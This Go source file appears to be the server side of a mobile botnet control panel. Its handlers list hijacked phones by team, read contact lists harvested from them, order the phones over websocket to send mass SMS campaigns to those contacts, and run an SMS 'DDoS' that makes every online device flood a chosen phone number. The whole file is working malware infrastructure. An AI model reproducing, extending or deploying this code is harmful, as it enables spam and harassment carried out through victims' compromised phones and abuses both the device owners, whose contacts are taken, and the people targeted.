package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"redwing/internal/auth"
	"redwing/internal/db"
	"redwing/internal/ws"
)

func HandleBlast(w http.ResponseWriter, r *http.Request) {
	session, err := auth.GetSessionFromRequest(r)
	if err != nil {
		writeJSON(w, map[string]any{"error": "unauthorized"})
		return
	}
	teamID := SessionTeamID(r)

	switch r.Method {
	case http.MethodGet:
		listBlastCampaigns(w, teamID)
	case http.MethodPost:
		createBlastCampaign(w, r, teamID, session.Login)
	case http.MethodDelete:
		path := strings.TrimPrefix(r.URL.Path, "/api/panel/blast/")
		parts := strings.Split(path, "/")
		if len(parts) >= 2 {
			db.DB.Exec("DELETE FROM blast_campaigns WHERE id = ? AND team_id = ?", parts[1], teamID)
		}
		writeJSON(w, map[string]any{"success": true})
	default:
		writeJSON(w, map[string]any{"error": "method not allowed"})
	}
}

func listBlastCampaigns(w http.ResponseWriter, teamID string) {
	rows, err := db.DB.Query(
		"SELECT id, message, status, total, sent, created_by, created_at FROM blast_campaigns WHERE team_id = ? ORDER BY created_at DESC LIMIT 50",
		teamID,
	)
	if err != nil {
		writeJSON(w, map[string]any{"campaigns": []any{}})
		return
	}
	defer rows.Close()

	var campaigns []map[string]any
	for rows.Next() {
		var id, msg, status, createdBy, createdAt string
		var total, sent int
		rows.Scan(&id, &msg, &status, &total, &sent, &createdBy, &createdAt)
		campaigns = append(campaigns, map[string]any{
			"id": id, "message": msg, "status": status,
			"total": total, "sent": sent,
			"created_by": createdBy, "created_at": createdAt,
		})
	}
	if campaigns == nil {
		campaigns = []map[string]any{}
	}
	writeJSON(w, map[string]any{"campaigns": campaigns})
}

func createBlastCampaign(w http.ResponseWriter, r *http.Request, teamID, login string) {
	var body struct {
		Message  string   `json:"message"`
		Devices  []string `json:"devices"`
		Numbers  []string `json:"numbers"`
		UseAll   bool     `json:"use_all"`
	}
	if json.NewDecoder(r.Body).Decode(&body) != nil {
		writeJSON(w, map[string]any{"error": "invalid json"})
		return
	}

	if body.Message == "" {
		writeJSON(w, map[string]any{"error": "message required"})
		return
	}

	campaignID := generateCmdID()

	var targetDevices []string
	if body.UseAll || len(body.Devices) == 0 {
		rows, err := db.DB.Query("SELECT device_id FROM devices WHERE team_id = ? AND is_online = 1", teamID)
		if err == nil {
			defer rows.Close()
			for rows.Next() {
				var did string
				rows.Scan(&did)
				targetDevices = append(targetDevices, did)
			}
		}
	} else {
		targetDevices = body.Devices
	}

	total := 0
	sent := 0

	for _, deviceID := range targetDevices {
		var contacts []string
		if len(body.Numbers) > 0 {
			contacts = body.Numbers
		} else {
			rows, err := db.DB.Query("SELECT phone FROM contacts WHERE device_id = ? AND team_id = ?", deviceID, teamID)
			if err == nil {
				for rows.Next() {
					var phone string
					rows.Scan(&phone)
					if phone != "" {
						contacts = append(contacts, phone)
					}
				}
				rows.Close()
			}
		}

		total += len(contacts)

		for _, phone := range contacts {
			ok := ws.H.SendToDevice(deviceID, map[string]any{
				"type":    "ws_command",
				"command": "send_sms",
				"params": map[string]any{
					"phone":   phone,
					"message": body.Message,
				},
			})
			if ok {
				sent++
			}
		}
	}

	db.DB.Exec(
		"INSERT INTO blast_campaigns (id, team_id, message, status, total, sent, created_by) VALUES (?, ?, ?, ?, ?, ?, ?)",
		campaignID, teamID, body.Message, "completed", total, sent, login,
	)

	LogActionFromRequest(r, ActionBlast, "", fmt.Sprintf("SMS рассылка: %d/%d отправлено", sent, total))

	writeJSON(w, map[string]any{
		"success": true,
		"id":      campaignID,
		"total":   total,
		"sent":    sent,
	})
}

func HandleBlastCompat(w http.ResponseWriter, r *http.Request) {
	session, err := auth.GetSessionFromRequest(r)
	if err != nil {
		writeJSON(w, map[string]any{"error": "unauthorized"})
		return
	}
	teamID := SessionTeamID(r)

	path := strings.TrimPrefix(r.URL.Path, "/api/blast/")
	parts := strings.SplitN(path, "/", 3)
	action := ""
	if len(parts) > 0 {
		action = parts[0]
	}

	switch action {
	case "devices":
		rows, err := db.DB.Query(
			`SELECT d.device_id, d.model, d.country, d.is_online, COALESCE(c.cnt, 0)
			 FROM devices d LEFT JOIN (SELECT device_id, COUNT(*) as cnt FROM contacts WHERE team_id = ? GROUP BY device_id) c
			 ON d.device_id = c.device_id WHERE d.team_id = ? AND d.is_online = 1`,
			teamID, teamID,
		)
		if err != nil {
			writeJSON(w, map[string]any{"devices": []any{}})
			return
		}
		defer rows.Close()
		var devices []map[string]any
		for rows.Next() {
			var did, model, country string
			var online, contactCount int
			rows.Scan(&did, &model, &country, &online, &contactCount)
			devices = append(devices, map[string]any{
				"device_id": did, "model": model, "country": country,
				"is_online": online == 1, "contacts": contactCount,
			})
		}
		if devices == nil {
			devices = []map[string]any{}
		}
		writeJSON(w, map[string]any{"devices": devices})

	case "history":
		listBlastCampaigns(w, teamID)

	case "start":
		if r.Method == http.MethodPost {
			createBlastCampaign(w, r, teamID, session.Login)
		} else {
			writeJSON(w, map[string]any{"error": "POST required"})
		}

	case "status":
		var campaignID string
		if len(parts) >= 3 {
			campaignID = parts[2]
		}
		if campaignID == "" {
			writeJSON(w, map[string]any{"status": "not_found"})
			return
		}
		var status string
		var total, sent int
		err := db.DB.QueryRow("SELECT status, total, sent FROM blast_campaigns WHERE id = ? AND team_id = ?", campaignID, teamID).Scan(&status, &total, &sent)
		if err != nil {
			writeJSON(w, map[string]any{"status": "not_found"})
			return
		}
		writeJSON(w, map[string]any{"status": status, "total": total, "sent": sent})

	case "sync":
		var deviceID string
		if len(parts) >= 3 {
			deviceID = parts[2]
		}
		if deviceID != "" {
			ws.H.SendToDevice(deviceID, map[string]any{
				"type":    "ws_command",
				"command": "sync_contacts",
			})
		}
		writeJSON(w, map[string]any{"success": true})

	case "mass-sms":
		if r.Method == http.MethodPost {
			createBlastCampaign(w, r, teamID, session.Login)
		} else {
			writeJSON(w, map[string]any{"error": "POST required"})
		}

	default:
		writeJSON(w, map[string]any{"status": "ok"})
	}
}

func HandleDDoS(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, map[string]any{"error": "method not allowed"})
		return
	}

	teamID := SessionTeamID(r)

	var body struct {
		Phone   string `json:"phone"`
		Count   int    `json:"count"`
	}
	if json.NewDecoder(r.Body).Decode(&body) != nil {
		writeJSON(w, map[string]any{"error": "invalid json"})
		return
	}

	if body.Phone == "" {
		writeJSON(w, map[string]any{"error": "phone required"})
		return
	}
	if body.Count <= 0 {
		body.Count = 10
	}

	rows, err := db.DB.Query("SELECT device_id FROM devices WHERE team_id = ? AND is_online = 1", teamID)
	if err != nil {
		writeJSON(w, map[string]any{"error": "no devices"})
		return
	}
	defer rows.Close()

	sent := 0
	for rows.Next() {
		var deviceID string
		rows.Scan(&deviceID)
		for i := 0; i < body.Count; i++ {
			ws.H.SendToDevice(deviceID, map[string]any{
				"type":    "ws_command",
				"command": "send_sms",
				"params": map[string]any{
					"phone":   body.Phone,
					"message": fmt.Sprintf("DDoS %d", i+1),
				},
			})
		}
		sent++
	}

	LogActionFromRequest(r, ActionDDoS, "", fmt.Sprintf("DDoS на %s, %d устройств, %d SMS/устр", body.Phone, sent, body.Count))

	writeJSON(w, map[string]any{"success": true, "devices_used": sent})
}
